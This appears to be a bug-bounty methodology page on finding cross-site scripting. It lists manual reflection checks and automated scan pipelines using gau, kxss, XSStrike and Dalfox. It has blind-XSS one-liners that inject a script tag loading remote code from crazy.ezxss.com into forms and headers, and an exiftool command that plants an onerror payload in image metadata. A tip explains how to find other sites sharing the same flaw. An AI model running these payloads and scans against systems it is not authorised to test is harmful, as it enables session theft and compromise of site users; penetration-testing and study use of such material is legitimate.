# Top Bug Hunters XSS Hunting Methodology

## XSS Manual Hunting Methodology (LostSec)

* [ ] Enter `coffinxp123` and check for reflections (where it is reflected).&#x20;
* [ ] Understand the context where it is reflected.&#x20;
* [ ] Try to bypass/break that context with the help of simple HTML Injection/Payloads. (i.e., `<u>siddharth</u>`)
* [ ] Once we confirm HTML Injection we can proceed to execute XSS either using event handlers or breaking the context of the input reflection.&#x20;

{% hint style="info" %}
_Note that XSS doesn't execute in the same way in all the browser. If you think you've break the context and still the XSS is not executing then try switching the browser._&#x20;
{% endhint %}

Encoder used by lostsec [`https://dencode.com`](https://dencode.com/)&#x20;

Useful Encoding Mechanisms: `'URL Encoding'`, `HTML Entity Encoding`

## Automated Methodology (LostSec)

**Exact commands used by Lostsec to find XSS:**

1. `echo https://www.target.com | gau | gf xss | uro | gxss | kxss | tee xss_output.txt`&#x20;
2. Clean the output: `cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/-/' | sort -u > final.txt`&#x20;
3. Move this folder to loxs tool folder and fed this file to the LOXS XSS Scanner and boom :bomb::bomb:.&#x20;

## Automate Advanced XSS with XSStrike and Dalfox (AmrSec)

* [ ] Enter `coffinxp123` and check for reflections (where it is reflected).&#x20;
* [ ] Understand the context where it is reflected.&#x20;
* [ ] Copy the URL and paste it in the XSStrike and Dalfox tool.&#x20;

{% hint style="info" %}
_Note that you first need to understand the context of possible XSS cases in order to use these tools. Don't just give all the URLs with the parameters here. Try to understand why should we give this URL to that tool and you're good to go._&#x20;
{% endhint %}

## Mass XSS Hunting (ProwlSec)

Prowlsec explained how to find mass XSS across web applications. Once you discover an XSS vulnerability in one site, locate that site's copyright tag and search Google for other sites using the same tag — those sites often belong to the same organization and may share the same vulnerability.

## LostSec Blind XSS Hunting Methodology&#x20;

{% hint style="info" %}
_This is the_ [_link_](https://www.enciphers.com/web-app-security/setting-up-xss-hunter-on-digitalocean) _for setting up XSS Hunter express on digital ocean along with the domain. This will be useful while Pentesting on a private web application._&#x20;
{% endhint %}

### Manual

* [ ] Find pages probably vulnerable to blind XSS for a specific domain [here](https://lostsec.xyz/coffin/dorking.html) (Blind XSS Dorker).
* [ ] &#x20;Use any open source blind XSS manager such as [ezXSS](https://www.ez.pe/), [bxsshunter](https://bxsshunter.com/bxss-hunter), [XSS Hunter Truffle security ](https://xsshunter.trufflesecurity.com/) and [xss.report](https://xss.report/dashboard) and copy the payloads and paste it within the forms. Local XSS manager: [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express).
* [ ] &#x20;Use these [Blind XSS Manager Extension for Chrome](https://github.com/SeifElsallamy/Blind-XSS-Manager) to directly copy and paste payload into the forms.&#x20;
* [ ] Use `Match and Replace` option in the BurpSuite or any Web Proxy and add paylaods to these request headers: `Referrer`, `Origin`, `Cookie`, `Accept`, `Host`, `X-Forwarded-For`.&#x20;
* [ ] Have Patience and wait.&#x20;

### Automated

* [ ] Use `arjun` to gather endpoints.&#x20;

{% code overflow="wrap" %}
```
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

cat arjun_output.txt | bxss -payload '"><script/src=https://crazy.ezxss.com></script>' -header "X-Forwarded-For"
```
{% endcode %}

{% code overflow="wrap" %}
```
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"

cat arjun_output.txt | bxss -payload '"><script/src=https://crazy.ezxss.com></script>' -header "X-Forwarded-For"
```
{% endcode %}

* [ ] Using one liner payloads:&#x20;

{% code overflow="wrap" %}
```
subfinder -d vulnweb.com | gau | grep "&" | bxss -appendMode -payload '"><script/src=https://crazy.ezxss.com></script>' -parameters

subfinder -d vulnweb.com | gau | bxss -payload '"><script/src=https://crazy.ezxss.com></script>' -header "X-Forwarded-For"
```
{% endcode %}

## XSS Via File Metadata

### Create malicious XSS file

#### In Windows

Right click on the image -> Properties -> Details -> Paste your payload into the fields like 'Title', 'Subject' or 'Comments'.&#x20;

#### In Linux

```bash
exiftool -Comment='"><img src=x onerror=alert(1)>' test.jpg
```

_Just upload the image and boom_ :bomb:.&#x20;

#### Master trick

Enter all your payload in a single HTML file and upload it. Atleast one payload might work.&#x20;
